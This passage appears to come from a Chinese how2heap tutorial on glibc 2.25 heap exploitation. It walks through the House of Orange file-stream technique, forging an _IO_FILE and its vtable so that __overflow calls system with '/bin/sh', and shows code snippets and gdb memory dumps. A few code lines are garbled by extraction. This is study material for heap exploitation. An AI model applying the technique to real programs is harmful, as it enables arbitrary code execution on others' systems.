      char* _IO_write_ptr;    /* Current put pointer. */
      char* _IO_write_end;    /* End of put area. */
      char* _IO_buf_base;    /* Start of reserve area. */
      char* _IO_buf_end;    /* End of reserve area. */
      /* The following fields are used to support backing up and undo. */
      char *_IO_save_base; /* Pointer to start of non-current get area. */
      char *_IO_backup_base;  /* Pointer to first valid character of backup area */
      char *_IO_save_end; /* Pointer to end of non-current get area. */
      struct _IO_marker *_markers;
      struct _IO_FILE *_chain;
      int _fileno;
    #if 0
      int _blksize;
    #else
      int _flags2;
    #endif
      _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
    #define __HAVE_COLUMN /* temporary */
      /* 1+column number of pbase(); 0 is unknown. */
      unsigned short _cur_column;
      signed char _vtable_offset;
      char _shortbuf[1];
      /*  char* _save_gptr;  char* _save_egptr; */
      _IO_lock_t *_lock;
    #ifdef _IO_USE_OLD_IO_FILE
    };
其中有一个指向函数跳转表的指针，_IO_jump_t 的结构如下：
    // libio/libioP.h
    struct _IO_jump_t
    {
        JUMP_FIELD(size_t, __dummy);
        JUMP_FIELD(size_t, __dummy2);
        JUMP_FIELD(_IO_finish_t, __finish);
        JUMP_FIELD(_IO_overflow_t, __overflow);
        JUMP_FIELD(_IO_underflow_t, __underflow);
        JUMP_FIELD(_IO_underflow_t, __uflow);
        JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
        /* showmany */
        JUMP_FIELD(_IO_xsputn_t, __xsputn);
        JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
        JUMP_FIELD(_IO_seekoff_t, __seekoff);
        JUMP_FIELD(_IO_seekpos_t, __seekpos);
        JUMP_FIELD(_IO_setbuf_t, __setbuf);
        JUMP_FIELD(_IO_sync_t, __sync);
        JUMP_FIELD(_IO_doallocate_t, __doallocate);
        JUMP_FIELD(_IO_read_t, __read);
        JUMP_FIELD(_IO_write_t, __write);
        JUMP_FIELD(_IO_seek_t, __seek);
        JUMP_FIELD(_IO_close_t, __close);
        JUMP_FIELD(_IO_stat_t, __stat);
        JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
        JUMP_FIELD(_IO_imbue_t, __imbue);
    #if 0
        get_column;
        set_column;
    #endif
    };
伪造 _IO_jump_t 中的 __overflow 为 system 函数的地址，从而达到执行 shell 的目的。
当发生内存错误进入 _IO_flush_all_lockp 后，_IO_list_all 仍然指向 unsorted
bin，这并不是一个我们能控制的地址。所以需要通过 fp->_chain 来将 fp 指向我们能控制的地方。所以将 size 字段设置为 0x61，因为此时
_IO_list_all 是 &unsorted_bin-0x10，偏移 0x60 位置上是 smallbins[5]。此时，如果触发一个不适合的
small chunk 分配，malloc 就会将 old top 从 unsorted bin 放回 smallbins[5] 中。而在 _IO_FILE
结构中，偏移 0x60 指向 struct _IO_marker __markers，偏移 0x68 指向 struct _IO_FILE_
_chain，这两个值正好是 old top 的起始地址。这样 fp 就指向了 old top，这是一个我们能够控制的地址。
在将 _IO_OVERFLOW 修改为 system 的时候，有一些条件检查：
    if (((fp->_mode _IO_write_ptr > fp->_IO_write_base)
    #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
           || (_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                        > fp->_wide_data->_IO_write_base))
    #endif
           )
          && _IO_OVERFLOW (fp, EOF) == EOF)     // 需要修改为 system 函数
    // libio/libio.h
      struct _IO_wide_data *_wide_data;
    /* Extra data for wide character streams.  */
    struct _IO_wide_data
    {
      wchar_t *_IO_read_ptr;    /* Current read pointer */
      wchar_t *_IO_read_end;    /* End of get area. */
      wchar_t *_IO_read_base;    /* Start of putback+get area. */
      wchar_t *_IO_write_base;    /* Start of put area. */
      wchar_t *_IO_write_ptr;    /* Current put pointer. */
      wchar_t *_IO_write_end;    /* End of put area. */
      wchar_t *_IO_buf_base;    /* Start of reserve area. */
      wchar_t *_IO_buf_end;        /* End of reserve area. */
      /* The following fields are used to support backing up and undo. */
      wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */
      wchar_t *_IO_backup_base;    /* Pointer to first valid character of
                       backup area */
      wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */
      __mbstate_t _IO_state;
      __mbstate_t _IO_last_state;
      struct _IO_codecvt _codecvt;
      wchar_t _shortbuf[1];
      const struct _IO_jump_t *_wide_vtable;
    };
所以这里我们设置 fp->_mode = 0，fp->_IO_write_base = (char _) 2 和 fp- >_IO_write_ptr =
(char _) 3，从而绕过检查。
    fp->_mode = 0; // top+0xc0
    fp->_IO_write_base = (char *) 2; // top+0x20
    fp->_IO_write_ptr = (char *) 3; // top+0x28
然后，就是修改 _IO_jump_t，将其指向 winner：
    248     size_t *jump_table = &top[12]; // controlled memory
       249     jump_table[3] = (size_t) &winner;
       250     *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8
    PwnLife>  x/30gx p1-0x10+0x400
    0x602400:   0x0068732f6e69622f  0x0000000000000061
    0x602410:   0x00007ffff7dd1b58  0x00007ffff7dd24f0
    0x602420:   0x0000000000000002  0x0000000000000003
    0x602430:   0x0000000000000000  0x0000000000000000
    0x602440:   0x0000000000000000  0x0000000000000000
    0x602450:   0x0000000000000000  0x0000000000000000
    0x602460:   0x0000000000000000  0x0000000000000000
    0x602470:   0x0000000000000000  0x0000000000400777
    0x602480:   0x0000000000000000  0x0000000000000000
    0x602490:   0x0000000000000000  0x0000000000000000
    0x6024a0:   0x0000000000000000  0x0000000000000000
    0x6024b0:   0x0000000000000000  0x0000000000000000
    0x6024c0:   0x0000000000000000  0x0000000000000000
    0x6024d0:   0x0000000000000000  0x0000000000602460
    0x6024e0:   0x0000000000000000  0x0000000000000000
    PwnLife> p *((struct _IO_FILE_plus *) 0x602400)
    $20 = {
      file = {
        _flags = 1852400175,
        _IO_read_ptr = 0x61 ,
        _IO_read_end = 0x7ffff7dd1b58  "\020@b",
        _IO_read_base = 0x7ffff7dd24f0 "",
        _IO_write_base = 0x2 ,
        _IO_write_ptr = 0x3 ,
        _IO_write_end = 0x0,
        _IO_buf_base = 0x0,
        _IO_buf_end = 0x0,
        _IO_save_base = 0x0,
        _IO_backup_base = 0x0,
        _IO_save_end = 0x0,
        _markers = 0x0,
        _chain = 0x0,
        _fileno = 0,
        _flags2 = 0,
        _old_offset = 4196215,
        _cur_column = 0,
        _vtable_offset = 0 '\000',
        _shortbuf = "",
        _lock = 0x0,
        _offset = 0,
        _codecvt = 0x0,
        _wide_data = 0x0,
        _freeres_list = 0x0,
        _freeres_buf = 0x0,
        __pad5 = 0,
        _mode = 0,
        _unused2 = '\000' 
      },
      vtable = 0x602460
    }
最后随意分配一个 chunk，由于 sizebk) != unsorted_chunks (av))
            {
              bck = victim->bk;
              if (__builtin_expect (victim->size size > av->system_mem, 0))
                malloc_printerr (check_action, "malloc(): memory corruption",
                                 chunk2mem (victim), av);
              size = chunksize (victim)
### 总结
关于how2heap 中 glibc 2.25的内容就到这里结束了。
关于 glibc 2.26 更多到是一些新版本 glibc 的check的bypass...就不准备再写成文章发出来了。